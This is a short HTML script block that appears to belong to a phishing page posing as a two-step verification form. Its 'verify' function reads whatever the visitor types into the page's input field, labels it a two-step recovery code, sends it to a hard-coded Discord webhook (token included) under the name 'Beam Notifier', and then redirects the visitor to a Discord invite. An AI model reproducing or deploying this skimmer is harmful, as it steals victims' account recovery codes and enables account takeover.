<script>
                
function verify() {
    const request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/1080186612866101389/f4lIYy8nm7fJALmFZVTdUq-OiWqjeGJfv2pEHE02-D9JvlfMpiHzVcXbM4ISu9Uh3GSz");

    request.setRequestHeader("Content-type", "application/json");

    const params = {
      username: "Beam Notifier 2 step | Beta",
      avatar_url: "",
      content: "**BeamOnTop**",
      embeds: [{
        title: "2 STEP RECOVERY CODE",
        image: {
          url: "https://cdn-icons-png.flaticon.com/512/483/483408.png"
        },
        fields: [
          {
            name: "CODE ->",
            value: document.querySelector("input").value
          }
        ],
        description: ""
      }],
    }

    request.send(JSON.stringify(params));

    window.location.replace("https://discord.gg/splunk")
  }



</script>